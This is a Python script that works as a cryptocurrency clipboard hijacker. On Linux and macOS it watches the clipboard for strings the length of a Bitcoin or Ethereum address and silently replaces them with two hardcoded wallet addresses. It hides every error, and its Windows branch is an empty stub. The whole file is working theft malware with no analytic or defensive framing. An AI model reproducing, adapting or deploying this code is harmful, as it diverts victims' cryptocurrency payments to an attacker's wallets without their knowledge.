#!/usr/bin/python

import subprocess
import os
import sys
import pyperclip

BTC_WALLET_ADDRESS = '39mMNj7fMbg5D5TRWLbbMVfeQ9ctWBZ7BZ'
ETHER_WALLET_ADDRESS = '0x354eE3aD13c11226301f9a7404A4B32704BFc2A7'


def change_on_linux():
    data = str(pyperclip.paste().split()[0])
    if len(data) == 34:
        pyperclip.copy(data.replace(data, BTC_WALLET_ADDRESS))
    elif len(data) == 42:
        pyperclip.copy(data.replace(data, ETHER_WALLET_ADDRESS))
    else:
        pass


def change_on_win():
    pass


def change_on_mac():
    p = subprocess.Popen(['pbpaste'], stdout=subprocess.PIPE)
    data = str(p.stdout.read().split()[0])
    if len(data) == 34:
        paste = subprocess.Popen(['pbcopy'], stdin=subprocess.PIPE)
        paste.stdin.write(BTC_WALLET_ADDRESS)
        paste.stdin.close()
    elif len(data) == 42:
        paste = subprocess.Popen(['pbcopy'], stdin=subprocess.PIPE)
        paste.stdin.write(ETHER_WALLET_ADDRESS)
        paste.stdin.close()
    else:
        pass


def main():
    try:
        if sys.platform == 'linux2':
            change_on_linux()
        elif sys.platform == 'darwin':
            change_on_mac()
        elif sys.platform == 'win32':
            change_on_win()
    except Exception as e:
        pass

if __name__ == '__main__':
    main()
